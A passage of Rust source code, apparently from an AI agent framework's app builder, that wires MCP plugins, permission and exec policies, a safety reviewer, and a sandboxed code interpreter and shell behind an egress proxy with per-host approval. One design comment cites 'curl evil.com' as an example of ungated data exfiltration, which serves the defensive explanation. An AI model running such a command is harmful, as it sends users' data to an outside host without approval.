    // ─── MCP Plugin Integration ──────────────────────────────────────────────

    /// Set the MCP plugin registry for managing external MCP servers.
    ///
    /// The MCP plugin registry manages connections to external MCP server
    /// plugins. When configured, the build() method will:
    /// - Connect all enabled MCP servers
    /// - Discover their tools
    /// - Register discovered tools into the ToolRegistry
    ///
    /// **Usage**:
    /// ```ignore
    /// let mcp_registry = McpPluginRegistry::from_config_file();
    /// let app = AppBuilder::new()
    ///     .provider(provider)
    ///     .mcp_plugin_registry(mcp_registry)  // ← connect MCP plugins
    ///     .build()?;
    /// ```
    pub fn mcp_plugin_registry(mut self, registry: McpPluginRegistry) -> Self {
        self.mcp_plugin_registry = Some(registry);
        self
    }

    /// Override the data-layer reloader (evolution-plan §3.4). When set, the
    /// `reload` tool is backed by this reloader instead of the default
    /// `AppDataLayerReloader` (skills + MCP re-registration). Use this to
    /// plug a custom reloader or a no-op impl that suppresses reload
    /// semantics.
    pub fn data_layer_reloader(
        mut self,
        reloader: Arc<dyn oneai_core::traits::DataLayerReloader>,
    ) -> Self {
        self.data_layer_reloader = Some(reloader);
        self
    }

    /// Load MCP servers from the default config file and auto-connect.
    ///
    /// Reads `~/.oneai/mcp_servers.toml`, creates a McpPluginRegistry,
    /// and connects all enabled servers at build time. Discovered tools
    /// are automatically registered into the ToolRegistry.
    ///
    /// **Usage**:
    /// ```ignore
    /// let app = AppBuilder::new()
    ///     .provider(provider)
    ///     .mcp_servers_from_config()  // ← auto-connect MCP servers
    ///     .build()?;
    /// ```
    pub fn mcp_servers_from_config(mut self) -> Self {
        self.mcp_plugin_registry = Some(McpPluginRegistry::from_config_file());
        self
    }

    /// Enable MCP server hosting — expose OneAI tools via MCP protocol.
    ///
    /// When enabled, the App can serve its tools as an MCP server,
    /// allowing external MCP clients (Claude Code, Cursor, etc.) to
    /// discover and invoke OneAI tools via the MCP JSON-RPC protocol.
    ///
    /// The server host is created but not started — it must be started
    /// explicitly via `App.mcp_server_host().run_stdio()` or similar.
    ///
    /// **Usage**:
    /// ```ignore
    /// let app = AppBuilder::new()
    ///     .provider(provider)
    ///     .mcp_server_host()  // ← enable MCP server hosting
    ///     .build()?;
    ///
    /// // Later, start the server:
    /// app.mcp_server_host().unwrap().run_stdio().await?;
    /// ```
    pub fn mcp_server_host(mut self) -> Self {
        self.mcp_server_host_enabled = true;
        self
    }

    /// Build the application.
    ///
    /// This creates the App and eagerly registers all domain pack tools
    /// into the ToolRegistry and WorkflowExecutor, so they are ready
    /// before any session is created.
    pub async fn build(mut self) -> Result<App> {
        // The unified interaction gate defaults to Noop (every point disabled,
        // zero latency) — production runs without a UI are not blocked. A TUI or
        // platform app wires a Channel/Threshold gate via the interaction_gate* builders.
        let interaction_gate = self
            .interaction_gate
            .unwrap_or_else(|| Arc::new(NoopInteractionGate));

        let parser = self
            .parser
            .unwrap_or_else(|| Arc::new(ThreeLayerParser::new()));

        // Merge domain packs (if any)
        let merged_domain_pack = if self.domain_packs.is_empty() {
            None
        } else {
            Some(Arc::new(MergedDomainPack::merge(self.domain_packs)))
        };

        // Create WASM module manager if runtime is provided
        let wasm_module_manager = self
            .wasm_runtime
            .as_ref()
            .map(|rt| WasmModuleManager::new(rt.clone()));

        // Auto-create WASM module registry if runtime is set but no registry
        let wasm_module_registry = self.wasm_module_registry.or_else(|| {
            self.wasm_runtime
                .as_ref()
                .map(|rt| WasmModuleRegistry::new(rt.clone()))
        });

        // Auto-create WASM resource monitor if runtime is set but no monitor
        let wasm_resource_monitor = self.wasm_resource_monitor.or_else(|| {
            if self.wasm_runtime.is_some() {
                Some(Arc::new(WasmResourceMonitor::new()))
            } else {
                None
            }
        });

        // Domain permission resolver — the merged DomainPack's
        // `PermissionProfile`, exposed via the core-level `PermissionResolver`
        // trait so the ToolExecutor / WorkflowExecutor (which live below
        // oneai-domain in the dep graph) honour DomainPack `deny_by_default`
        // / `require_confirmation` policy. Closes the gap-analysis P1 bypass
        // where tool-execution paths diverged from the agent-loop's permission
        // checks. `None` when no domain pack is configured.
        let permission_resolver: Option<Arc<dyn PermissionResolver>> = merged_domain_pack
            .as_ref()
            .map(|dp| Arc::new(dp.permission_profile.clone()) as Arc<dyn PermissionResolver>);

        // #27 — exposure resolver: the same `PermissionProfile` (which impls
        // `ExposureResolver`) overrides a tool's `Tool::exposure` with the
        // DomainPack's `tool_exposure` map. Wired into the model-schema
        // filter (agent loop), the code-mode bridge tool list, and the
        // `tool_search` discovery tool. `None` when no domain pack is
        // configured → `effective_exposure` falls back to `Tool::exposure`.
        let exposure_resolver: Option<Arc<dyn oneai_core::traits::ExposureResolver>> =
            merged_domain_pack.as_ref().map(|dp| {
                Arc::new(dp.permission_profile.clone())
                    as Arc<dyn oneai_core::traits::ExposureResolver>
            });

        // #28 Stage 2 — Guardian (content-level safety review). The policy
        // comes from the DomainPack's PermissionProfile when a domain is
        // configured, else the builder default (`guardian_policy`, OnFailure).
        // The reviewer is the `LlmGuardian` (rules + LLM fallback on Escalate)
        // when a provider is wired — otherwise the pure `RuleGuardian` (Escalate
        // stays Escalate → the policy decides). Mobile targets set no provider
        // and no domain → guardian stays `None` (the pre-Stage-2 behaviour).
        let guardian_working_dir = self
            .code_working_dir
            .clone()
            .or_else(|| std::env::current_dir().ok())
            .unwrap_or_else(|| std::path::PathBuf::from("."));
        let guardian_policy = merged_domain_pack
            .as_ref()
            .map(|dp| dp.permission_profile.approval_policy)
            .unwrap_or(self.guardian_policy);
        let trusted_dirs = merged_domain_pack
            .as_ref()
            .and_then(|dp| {
                if dp.permission_profile.trusted_dirs.is_empty() {
                    None
                } else {
                    Some(dp.permission_profile.trusted_dirs.clone())
                }
            })
            .or(self.trusted_dirs.clone())
            .unwrap_or_else(|| vec![guardian_working_dir.clone()]);
        // #28 Stage 4/5 — ExecPolicy rule layer. The static base rules come
        // from the merged DomainPack's PermissionProfile (config-driven
        // token-prefix rules). Stage 5 wraps them in an `ExecPolicyStore`
        // that also holds runtime amendments the user approved (hot-swapped +
        // persisted to `exec_rules_path`). `exec_amendment_enabled = false`
        // → in-memory store with no persistence (Stage-4 static posture).
        let exec_policy_base: Vec<oneai_tool::ExecRule> = merged_domain_pack
            .as_ref()
            .and_then(|dp| dp.permission_profile.exec_policy.as_ref())
            .map(|ep| ep.rules().to_vec())
            .unwrap_or_default();
        let exec_policy: Option<std::sync::Arc<oneai_tool::ExecPolicyStore>> = {
            let rules_file = if self.exec_amendment_enabled {
                Some(
                    self.exec_rules_path
                        .clone()
                        .unwrap_or_else(Self::default_exec_rules_path),
                )
            } else {
                None
            };
            Some(std::sync::Arc::new(oneai_tool::ExecPolicyStore::from_base(
                exec_policy_base,
                rules_file,
            )))
        };
        let guardian: Option<std::sync::Arc<oneai_tool::GuardianContext>> =
            if merged_domain_pack.is_some() || self.provider.is_some() {
                let reviewer: std::sync::Arc<dyn oneai_core::traits::CommandReviewer> =
                    match &self.provider {
                        Some(provider) => std::sync::Arc::new(oneai_agent::LlmGuardian::new(
                            provider.clone(),
                            "guardian",
                        )),
                        None => std::sync::Arc::new(oneai_tool::RuleGuardian::new()),
                    };
                Some(std::sync::Arc::new(oneai_tool::GuardianContext::new(
                    reviewer,
                    guardian_policy,
                    trusted_dirs,
                    guardian_working_dir.clone(),
                    exec_policy,
                )))
            } else {
                None
            };

        let tool_executor = {
            let exec = ToolExecutor::with_interaction_gate(
                self.tool_registry.clone(),
                interaction_gate.clone(),
            );
            let exec = match &permission_resolver {
                Some(r) => exec.with_permission_resolver(r.clone()),
                None => exec,
            };
            let exec = match &guardian {
                Some(g) => exec.with_guardian(g.clone()),
                None => exec,
            };
            let exec = match &self.permission_audit_log {
                Some(l) => exec.with_audit_log(l.clone()),
                None => exec,
            };
            Arc::new(exec)
        };

        // Build workflow executor with the tool registry. When a direct LLM
        // provider is set, attach it so prompt-based DAG steps run real
        // inference (otherwise prompt steps only emit interpolated text).
        // The provider_pool-config auto-build path resolves later (below), so
        // pool-only configs still get a provider at the App level — but DAG
        // prompt-steps there fall back to no-inference until a later pass.
        let workflow_executor = {
            let exec = if let Some(provider) = &self.provider {
                WorkflowExecutor::with_provider(
                    Arc::new(std::collections::HashMap::new()),
                    interaction_gate.clone(),
                    provider.clone(),
                )
            } else {
                WorkflowExecutor::new(
                    Arc::new(std::collections::HashMap::new()),
                    interaction_gate.clone(),
                )
            };
            // Wire the domain permission resolver so tool steps honour
            // deny_by_default on the workflow path too.
            let exec = match &permission_resolver {
                Some(r) => exec.with_permission_resolver(r.clone()),
                None => exec,
            };
            Arc::new(exec)
        };

        // Eagerly register domain pack tools at build time
        if let Some(domain) = &merged_domain_pack {
            for tool in &domain.tools {
                self.tool_registry.register(tool.clone()).await?;
                workflow_executor.register_tool(tool.clone()).await;
            }
        }

        // Register WASM action tools if runtime is configured
        if self.wasm_runtime.is_some() {
            for action_tool in WasmActionTool::all() {
                self.tool_registry.register(Arc::new(action_tool)).await?;
            }
        }

        // Register the `schedule` agent tool when a cron scheduler is
        // configured (Phase 3.2 agent-side seam) — zero footprint otherwise:
        // the tool is never registered, so the model never sees it
        // (Footprint Ladder: service-gated at the AppBuilder level).
        if let Some(cron) = &self.cron_scheduler {
            let tool = oneai_tool::ScheduleTool::new(cron.clone());
            self.tool_registry.register(Arc::new(tool)).await?;
        }

        // #27 — `tool_search` discovery tool. Registered always-on (Direct):
        // it lets the model discover `Deferred` / `DeferredModelOnly` tools the
        // DomainPack kept out of the initial schema (e.g. heavy / MCP tools
        // deferred to keep context focused). When no deferred tools exist it
        // returns an empty list — the one-tool footprint is the cost of the
        // discovery capability. Wired with the same `ExposureResolver` as the
        // code-mode bridge so config overrides (`tool_exposure` map) take
        // effect here too.
        {
            let tool = oneai_tool::ToolSearchTool::new(
                self.tool_registry.tools_map(),
                exposure_resolver.clone(),
            );
            self.tool_registry.register(Arc::new(tool)).await?;
        }

        // Code mode — sandboxed CPython code-interpreter tool (code_interpreter).
        // Registered plainly (not `register_gated`): the tool *itself* implements
        // `service_available()` (probes `python3` on PATH), and the AgentLoop's
        // `build_tool_definitions_*` filter already excludes tools whose
        // `service_available()` is false — so where the interpreter is absent
        // (mobile / native targets without a bundled CPython) the tool vanishes
        // from the schema entirely (zero footprint, with the discoverable warn
        // log). The tool holds the shared `tools_map` + gate + resolver (not the
        // `ToolExecutor`) so script-internal tool calls route through
        // `execute_with_approval` — the same approval path as a direct call,
        // without an Arc cycle.
        //
        // #28 Stage 1 — egress gate: when `network_proxy_enabled`, bind a local
        // CONNECT proxy (`NetworkProxy`) on the App runtime, run its accept loop
        // as a long-lived task, and wire `code_interpreter` to it: the sandbox
        // backend is `NetworkPolicy::LoopbackProxy` (loopback only — direct
        // egress blocked) and the spawn gets `HTTPS_PROXY=http://127.0.0.1:PORT`.
        // Per-host approval flows through the same `InteractionGate` via
        // `InteractionRequest::NetworkApproval`. When disabled (or unreachable
        // — bwrap netns can't reach host loopback, degrading to no-network),
        // the sandbox air-gaps to `Denied`. See plan hazy-imagining-liskov.md.
        //
        // #28 Stage 3 — the allowlist is now `SeededHostAllowlist` over an
        // `InMemoryHostAllowlist`: the seed pre-approves the common package
        // registries (npm/pypi/crates.io/…) so `npm install`/`pip install`/
        // `cargo build` work without a prompt; everything else still prompts.
        // The same seeded allowlist is shared with the ShellTool egress gate
        // below (host-level trust, not per-tool) — a host the user admits for
        // one sandboxed tool is admitted for all.
        {
            let working_dir = self
                .code_working_dir
                .clone()
                .or_else(|| std::env::current_dir().ok())
                .unwrap_or_else(|| std::path::PathBuf::from("."));

            let allowlist = if self.network_proxy_enabled {
                // #28 Stage 6 — when sqlite_persistence is configured, the host
                // allow/deny store is the durable `SqliteHostAllowlist` (shares
                // `~/.oneai/oneai.db`); a host admitted/blocked in one session
                // is honoured in the next. Otherwise the session-scoped
                // `InMemoryHostAllowlist` (lost on exit, re-prompts next time).
                let inner: std::sync::Arc<dyn oneai_tool::HostAllowlistStore> =
                    match &self.sqlite_store {
                        Some(store) => std::sync::Arc::new(
                            oneai_persistence::SqliteHostAllowlist::from_store(store),
                        ),
                        None => std::sync::Arc::new(InMemoryHostAllowlist::new()),
                    };
                std::sync::Arc::new(SeededHostAllowlist::new(inner))
                    as std::sync::Arc<dyn oneai_tool::HostAllowlistStore>
            } else {
                // Proxy disabled — no gate to consult; the Arc is unused. Keep
                // a cheap placeholder so the borrow checker is happy below.
                std::sync::Arc::new(InMemoryHostAllowlist::new())
                    as std::sync::Arc<dyn oneai_tool::HostAllowlistStore>
            };

            let proxy_port = if self.network_proxy_enabled {
                let bind = NetworkProxy::bind_with_mode(
                    interaction_gate.clone(),
                    allowlist.clone(),
                    "code_interpreter",
                    self.network_approval_mode,
                )
                .await;
                match bind {
                    Ok((proxy, port)) => {
                        tokio::spawn(proxy.run());
                        tracing::info!("code mode: egress proxy bound on 127.0.0.1:{port}");
                        Some(port)
                    }
                    Err(e) => {
                        tracing::warn!(
                            "code mode: egress proxy bind failed ({e}); air-gapping sandbox"
                        );
                        None
                    }
                }
            } else {
                None
            };

            let policy = if proxy_port.is_some() {
                NetworkPolicy::LoopbackProxy
            } else {
                NetworkPolicy::Denied
            };
            let sandbox = oneai_tool::default_sandbox_backend_with_policy(&working_dir, policy);
            let code_tool = oneai_tool::CodeInterpreterTool::new(
                self.tool_registry.tools_map(),
                interaction_gate.clone(),
                permission_resolver.clone(),
                tool_executor.config().clone(),
                sandbox,
                working_dir.clone(),
            );
            let code_tool = match proxy_port {
                Some(port) => code_tool.with_network_proxy(port),
                None => code_tool,
            };
            let code_tool = match &guardian {
                Some(g) => code_tool.with_guardian(g.clone()),
                None => code_tool,
            };
            let code_tool = match &self.permission_audit_log {
                Some(l) => code_tool.with_audit_log(l.clone()),
                None => code_tool,
            };
            // #27 — wire the exposure resolver so the code-mode bridge tool
            // list honours the DomainPack's `tool_exposure` map (e.g. a
            // `DirectModelOnly` tool is excluded from the script's callable set).
            let code_tool = match &exposure_resolver {
                Some(r) => code_tool.with_exposure_resolver(r.clone()),
                None => code_tool,
            };
            self.tool_registry.register(Arc::new(code_tool)).await?;

            // #28 Stage 3 — ShellTool egress gate. The CodingPack's ShellTool
            // runs with blanket `NetworkPolicy::Allowed` (so npm/pip/cargo
            // work) — which means `curl evil.com` exfiltrates with no approval
            // prompt. On macOS, where the seatbelt sandbox can restrict egress
            // to loopback only (`LoopbackProxy`), override that ShellTool with
            // a `LoopbackProxy`-sandboxed + proxy-wired one: direct egress is
            // blocked, so the command must go through the shared proxy (and
            // its per-host approval gate + seed allowlist). The seed keeps
            // `npm install`/`pip install`/`cargo build` prompt-free; any other
            // host prompts via `InteractionRequest::NetworkApproval`.
            //
            // Linux bwrap netns can't reach the host's loopback proxy, so the
            // gate is impossible there today — leave the CodingPack's `Allowed`
            // Shell (no regression: npm/pip/cargo still work, egress is just
            // ungated) and log it. A userspace net stack (slirp/pasta) would
            // close this — deferred to the Linux strong-gateway follow-up.
            if self.network_proxy_enabled && cfg!(target_os = "macos") {
                let shell_bind = NetworkProxy::bind_with_mode(
                    interaction_gate.clone(),
                    allowlist.clone(),
                    "shell",
                    self.network_approval_mode,
                )
                .await;
                match shell_bind {
                    Ok((proxy, shell_port)) => {
                        tokio::spawn(proxy.run());
                        tracing::info!(
                            "shell: egress proxy bound on 127.0.0.1:{shell_port} (LoopbackProxy sandbox)"
                        );
                        let shell_sandbox = oneai_tool::default_sandbox_backend_with_policy(
                            &working_dir,
                            NetworkPolicy::LoopbackProxy,
                        );
                        let shell_tool = oneai_tool::ShellTool::with_sandbox_backend(shell_sandbox)
                            .with_network_proxy(shell_port);
                        self.tool_registry
                            .override_tool(Arc::new(shell_tool))
                            .await?;
                    }
                    Err(e) => {
                        // Proxy bind failed — do NOT override (a LoopbackProxy
                        // sandbox without a reachable proxy would block all
                        // shell network, breaking npm/pip/cargo). Keep the
                        // CodingPack's `Allowed` shell; egress stays ungated.
                        tracing::warn!(
                            "shell: egress proxy bind failed ({e}); shell egress stays ungated (CodingPack Allowed)"
                        );
                    }
                }
            } else if self.network_proxy_enabled {
                tracing::info!(
                    "shell: egress gate unavailable on this platform (loopback proxy unreachable in bwrap netns); shell egress stays ungated. slirp/pasta (Linux strong-gateway) is a deferred follow-up."
                );
            }
        }

        // Connect MCP plugin servers and register discovered tools.
        //
        // Previously this only wrapped the registry in `Arc` and left
        // `connect_all_enabled` uncalled anywhere in the runtime path — so a
        // configured `mcp_servers_from_config()` build connected zero servers
        // and registered zero tools (issue #31). We now connect enabled
        // servers here on the owned registry (before it's shared via `Arc`)
        // and register discovered tools into the live `ToolRegistry`. Failures
        // are warned, not fatal — a single misconfigured server must not abort
        // app construction. The reloader (`AppDataLayerReloader`) re-runs
        // `register_tools` on `reload` to pick up re-discovered wrappers.
        let mcp_plugin_registry = match self.mcp_plugin_registry.take() {
            Some(reg) => {
                // Route MCP `elicitation/create` requests through the
                // InteractionGate (auto-decline under a Noop gate). Done
                // before `connect_all_enabled` so the first handshake has it.
                let reviewer = Arc::new(InteractionElicitationReviewer::new(
                    interaction_gate.clone(),
                ));
                reg.set_elicitation_reviewer(reviewer as Arc<dyn oneai_tool::ElicitationReviewer>)
                    .await;
                match reg.connect_all_enabled().await {
                    Ok(map) => {
                        let total: usize = map.values().map(Vec::len).sum();
                        tracing::info!(
                            "MCP plugin registry — connected {} server(s), {} tool(s) total",
                            map.len(),
                            total
                        );
                    }
                    Err(e) => {
                        tracing::warn!("MCP connect_all_enabled failed (continuing): {}", e);
                    }
                }
                if let Err(e) = reg.register_tools(&self.tool_registry).await {
                    tracing::warn!("MCP register_tools failed (continuing): {}", e);
                }
                Some(std::sync::Arc::new(reg))
            }
            None => None,
        };

        // Data-layer reloader (evolution-plan §3.4) — backs the `reload`
        // tool. Default = `AppDataLayerReloader` (skills + MCP
        // re-registration); a user-supplied reloader overrides it. The
        // reloader is always constructed (so the CLI `reload` subcommand and
        // `app.data_layer_reloader()` work), but the `reload` **tool** is
        // registered only when a data source is configured — zero footprint
        // otherwise (a bare `AppBuilder::new().build()` has no domain pack
        // and no MCP, so the model never sees a `reload` tool that would be
        // a no-op). This mirrors the `schedule` tool's AppBuilder-level
        // service-gating (Footprint Ladder). The AgentLoop reads the live
        // registries every turn, so a reload surfaces next step.
        let data_layer_reloader: Arc<dyn oneai_core::traits::DataLayerReloader> =
            self.data_layer_reloader.take().unwrap_or_else(|| {
                Arc::new(crate::reloader::AppDataLayerReloader::new(
                    self.skill_registry.clone(),
                    mcp_plugin_registry.clone(),
                    self.tool_registry.clone(),
                ))
            });
        let has_data_sources = merged_domain_pack.is_some() || mcp_plugin_registry.is_some();
        if has_data_sources {
            self.tool_registry
                .register(Arc::new(oneai_agent::ReloadTool::new(
                    data_layer_reloader.clone(),
                )))
                .await?;
        }

        // #31 Stage 5 — model-transparent lazy MCP. Each `lazy: true` enabled
        // server that wasn't connected at startup gets a `Deferred`
        // `McpLazyConnectTool` registered. The model discovers it via
        // `tool_search`; calling it connects the server + reloads (registering
        // the real `mcp__<server>__<tool>` wrappers) and the trigger then
        // self-vanishes (`service_available` → false). Skipped when there's no
        // MCP registry — zero footprint.
        if let Some(reg) = &mcp_plugin_registry {
            for entry in reg.list_entries() {
                if !entry.lazy || !entry.enabled {
                    continue;
                }
                // A lazy server is never connected at startup
                // (`connect_all_enabled` filters `!e.lazy`), but guard anyway
                // so a server that *was* connected (e.g. via an explicit
                // `connect_server` call) doesn't get a redundant trigger.
                if reg.is_connected(&entry.name).await {
                    continue;
                }
                let tool = oneai_mcp::McpLazyConnectTool::build(
                    entry.name.clone(),
                    entry.description.clone(),
                    mcp_plugin_registry.clone().unwrap(),
                    data_layer_reloader.clone(),
                );
                if let Err(e) = self.tool_registry.register(tool).await {
                    tracing::warn!(
                        "MCP lazy-connect tool for '{}' registration failed (continuing): {}",
                        entry.name,
                        e
                    );
                }
            }
        }

        // Create MCP server host if enabled
        let mcp_server_host = if self.mcp_server_host_enabled {
            Some(McpServerHost::new(self.tool_registry.clone()))
        } else {
            None
        };

        // Create A2A server host if enabled
        let a2a_server_host = if self.a2a_server_host_enabled {
            let agent_card = if let Some(card) = self.a2a_server_agent_card {
                card
            } else if let Some(domain) = &merged_domain_pack {
                oneai_a2a::agent_card_from_domain_pack(
                    &domain.as_ref().to_domain_pack(),
                    "http://localhost:8080",
                )
            } else {
                AgentCard::new("oneai-agent", "OneAI Agent", "http://localhost:8080")
            };
            let task_store = Arc::new(TaskStore::new());
            Some(A2AServerHost::new(agent_card, task_store))
        } else {
            None
        };

        // Resolve embedding service: explicit injection wins; otherwise the
        // config is auto-resolved (provider=Auto probes env/ollama; absent →
        // None, and memory recall falls back to keyword matching).
        let embedding_service = self.embedding_service.or_else(|| {
            self.embedding_config
                .as_ref()
                .and_then(|config| match config.build_service() {
                    Ok(Some(service)) => Some(service),
                    Ok(None) => {
                        tracing::info!(
                            "No embedding provider resolved; memory recall uses keyword matching"
                        );
                        None
                    }
                    Err(err) => {
                        tracing::warn!("Failed to resolve embedding service from config: {}", err);
                        None
                    }
                })
        });

        // Wire embedding service into MemoryManager if configured
        let memory_manager_config = Self::memory_manager_config(self.core_memory_budget_tokens);
        let memory_manager = if embedding_service.is_some() && self.memory_manager.is_none() {
            // Create MemoryManager with embedding service
            Arc::new(MemoryManager::with_embedding(
                memory_manager_config,
                embedding_service.clone().unwrap(),
            ))
        } else {
            self.memory_manager.unwrap_or_else(|| {
                Arc::new(MemoryManager::with_config(memory_manager_config.clone()))
            })
        };

        // Default retrieval stack (oneai-vector): wire an InMemoryVectorBackend
        // into the MemoryManager (real-ANN semantic recall, sized to the
        // embedder's dim) and, when no RAG index was supplied, build a
        // default-stack DocumentIndex (BM25 + dense → RRF). Pure opt-in —
        // without `.default_retrieval_stack()`, memory recall stays
        // brute-force and RAG is whatever the user supplied.
        if self.enable_default_retrieval_stack {
            if let Some(e) = &embedding_service {
                let dim = e.actual_dimension().await?;
                if dim > 0 {
                    let backend: Arc<dyn VectorBackend> =
                        Arc::new(oneai_vector::InMemoryVectorBackend::new(dim));
                    memory_manager.set_vector_backend(Some(backend)).await;
                }
            } else {
                // No embedder: still enable keyword-only BM25 for RAG (below);
                // memory recall stays keyword/brute-force (no vector leg).
            }
            if self.rag_index.is_none() {
                let index = if let Some(b) = self.retrieval_backend.clone() {
                    DocumentIndex::with_defaults_and_backend(b)
                } else {
                    DocumentIndex::with_default_stack(
                        embedding_service.clone(),
                        self.reranker.clone(),
                    )
                    .await?
                };
                self.rag_index = Some(Arc::new(index));
            }
        }

        // P5: namespace memory by user id (cross-session habits) and register
        // self-managed memory tools when the active domain opts in.
        if let Some(uid) = &self.user_id {
            memory_manager.set_user_id(uid.clone()).await;
        }
        // Phase 2.4 — thread the merged DomainPack's decay policy into the
        // memory manager (mirrors set_user_id). `enabled=false` (coding
        // default) makes `run_decay` a no-op, so existing behavior is
        // unchanged unless the domain opts in (research / assistant).
        if let Some(domain) = &merged_domain_pack {
            memory_manager
                .set_decay_policy(Some(domain.memory_profile.decay.clone()))
                .await;
        }
        // Self-managed memory tools (`memory_search` / `core_memory_edit` /
        // `archival_memory_insert`). Default ON for every domain (issue #12):
        // per-turn model-driven memory capture is a default mechanism, not a
        // domain-specific opt-in. A domain explicitly setting
        // `enable_memory_tools(false)` opts out; no domain pack at all (the
        // mobile/macOS native path) also defaults ON so the agent can
        // remember across sessions out of the box.
        let memory_tools_on = merged_domain_pack
            .as_ref()
            .map(|d| d.memory_profile.enable_memory_tools)
            .unwrap_or(true);
        if memory_tools_on {
            let mm = memory_manager.clone();
            let recall_cfg = merged_domain_pack
                .as_ref()
                .map(|d| d.memory_profile.recall.clone())
                .unwrap_or_default();
            self.tool_registry
                .register(Arc::new(oneai_memory::MemorySearchTool::with_recall_config(
                    mm.clone(),
                    recall_cfg,
                )) as Arc<dyn Tool>)
                .await?;
            self.tool_registry
                .register(
                    Arc::new(oneai_memory::CoreMemoryEditTool::new(mm.clone())) as Arc<dyn Tool>
                )
                .await?;
            self.tool_registry
                .register(Arc::new(oneai_memory::ArchivalInsertTool::new(mm)) as Arc<dyn Tool>)
                .await?;
        }

        // Resolve usage tracker: use explicitly set tracker, or auto-create from persistence
        let usage_tracker = self.usage_tracker.or_else(|| {
            if let Some(store) = &self.sqlite_store {
                // Auto-create persistent tracker if persistence is available
                Some(
                    Arc::new(oneai_persistence::SqliteUsageTracker::from_store(store))
                        as Arc<dyn UsageTracker>,
                )
            } else {
                None
            }
        });

        // Resolve rate limiter: use explicitly set limiter, or auto-create from config
        let rate_limiter = self.rate_limiter.or_else(|| {
            self.rate_limit_config.map(|config| {
                Arc::new(TokenWindowRateLimiter::with_config(config)) as Arc<dyn RateLimiter>
            })
        });

        // Resolve circuit breaker: use explicitly set breaker, or auto-create from config
        let circuit_breaker = self.circuit_breaker.or_else(|| {
            self.circuit_breaker_config.map(|config| {
                Arc::new(ThresholdCircuitBreaker::with_config(config)) as Arc<dyn CircuitBreaker>
            })
        });

        // Resolve model context resolver: explicit, or auto-create by default.
        // Seeded with L1 user-profiles from context_manager_config.profiles;
        // L1 provider-extras (ModelConfig.extra["context_window"]) are added
        // after the provider is resolved below.
        // Always provide a 3-layer resolver when none was explicitly attached.
        // The builtin L3 library + name-heuristic path resolves the context
        // window for any known model (e.g. glm-5.2 → 203K) synchronously,
        // without a network request. Without this, `AppSession` falls back to
        // a hardcoded 100_000 (session.rs), so the budget threshold (0.8×window)
        // is wrong — e.g. a 203K model compresses at 80K instead of ~162K,
        // destroying mid-task instructions far earlier than the displayed
        // window suggests. Seeded with L1 user-profiles from
        // `context_manager_config.profiles`; L1 provider-extras
        // (`ModelConfig.extra["context_window"]`) are added after the provider is
        // resolved below. The resolver is cheap (a lookup table) and its sync
        // `resolve_cached` path never probes, so wiring it unconditionally is
        // safe even with no provider.
        let resolved_resolver: Option<Arc<oneai_core::ModelContextResolver>> =
            self.model_context_resolver.clone().or_else(|| {
                let mut profiles = std::collections::HashMap::new();
                if let Some(cfg) = &self.context_manager_config {
                    for p in &cfg.profiles {
                        if p.context_window_tokens > 0 {
                            profiles.insert(p.model_name.clone(), p.context_window_tokens);
                        }
                    }
                }
                Some(Arc::new(oneai_core::ModelContextResolver::new(
                    profiles,
                    std::collections::HashMap::new(),
                )))
            });

        // Resolve token counter: use explicitly set counter, or create default
        let resolved_token_counter = self.token_counter.or_else(|| {
            if self.context_manager_config.is_some() || self.context_manager.is_some() {
                // Auto-create if context manager is configured, attaching the
                // resolver so context_window_size consults the 3-layer path.
                // gap P2 #13 — real BPE counting (tiktoken), heuristic only
                // for the per-model overhead profiles.
                let mut counter = oneai_core::TiktokenTokenCounter::new();
                if let Some(r) = &resolved_resolver {
                    counter = counter.with_resolver(r.clone());
                }
                Some(Arc::new(counter) as Arc<dyn TokenCounter>)
            } else {
                None
            }
        });

        // Resolve context manager: use explicitly set manager, or auto-create from config
        let resolved_context_manager = self.context_manager.or_else(|| {
            self.context_manager_config.map(|config| {
                let tc = resolved_token_counter.clone().unwrap_or_else(|| {
                    Arc::new(oneai_core::TiktokenTokenCounter::new()) as Arc<dyn TokenCounter>
                });
                let cm = ContextManager::from_config(config, tc);
                let cm = if let Some(r) = &resolved_resolver {
                    cm.with_resolver(r.clone())
                } else {
                    cm
                };
                Arc::new(cm)
            })
        });

        // Resolve smart router: use explicitly set router, or auto-create from config
        // The smart router uses ModelRouter defaults.
        // It needs circuit breaker and rate limiter to be already resolved
        let resolved_smart_router = self.smart_router.or_else(|| {
            self.smart_route_config.map(|config| {
                // Create a default ModelRouter for the smart router's regex first-pass
                // Use Anthropic as fallback config if no pool is configured
                let fallback_config = ModelConfig {
                    provider_type: oneai_core::ProviderType::Cloud,
                    cloud_kind: Some(CloudProviderKind::Anthropic),
                    api_key: std::env::var("ANTHROPIC_API_KEY").ok(),
                    base_url: None,
                    port: None,
                    model_name: Some("claude-sonnet-4-6-20250514".to_string()),
                    model_path: None,
                    extra: std::collections::HashMap::new(),
                };
                let model_router = oneai_provider::ModelRouter::with_defaults(fallback_config);

                let mut router = SmartRouter::new(model_router, config);
                if let Some(cb) = &circuit_breaker {
                    router = router.with_circuit_breaker(cb.clone());
                }
                if let Some(rl) = &rate_limiter {
                    router = router.with_rate_limiter(rl.clone());
                }
                // Wire TokenCounter into SmartRouter if configured
                if let Some(tc) = &resolved_token_counter {
                    router = router.with_token_counter(tc.clone());
                }
                Arc::new(router)
            })
        });

        // Resolve provider pool: use explicitly set pool, or auto-create from config
        // If a pool is created, it replaces the single provider (pool implements LlmProvider)
        let provider_pool = self.provider_pool.or_else(|| {
            self.provider_pool_config.map(|config| {
                let pool = ProviderPool::from_config(config);
                // Wire circuit breaker, rate limiter, usage tracker into the pool
                let mut pool = pool;
                if let Some(cb) = &circuit_breaker {
                    pool = pool.with_circuit_breaker(cb.clone());
                }
                if let Some(rl) = &rate_limiter {
                    pool = pool.with_rate_limiter(rl.clone());
                }
                if let Some(ct) = &usage_tracker {
                    pool = pool.with_usage_tracker(ct.clone());
                }
                // Wire smart router into the pool if configured
                if let Some(sr) = &resolved_smart_router {
                    pool = pool.with_smart_router(sr.clone());
                }
                Arc::new(pool)
            })
        });

        // If a provider pool is configured, use it as the provider
        // (pool implements LlmProvider, so it's a drop-in replacement)
        let provider = self.provider.or_else(|| {
            provider_pool
                .clone()
                .map(|pool| pool as Arc<dyn LlmProvider>)
        });

        // Seed L1 provider-extras from the resolved provider's ModelConfig.extra
        // (the highest-priority per-model user override channel besides the env var).
        if let (Some(resolver), Some(provider)) = (&resolved_resolver, &provider) {
            let cfg = provider.config();
            if let Some(model) = cfg.model_name.as_deref() {
                if let Some(cw) = cfg.extra.get("context_window") {
                    if let Ok(v) = cw.parse::<u32>() {
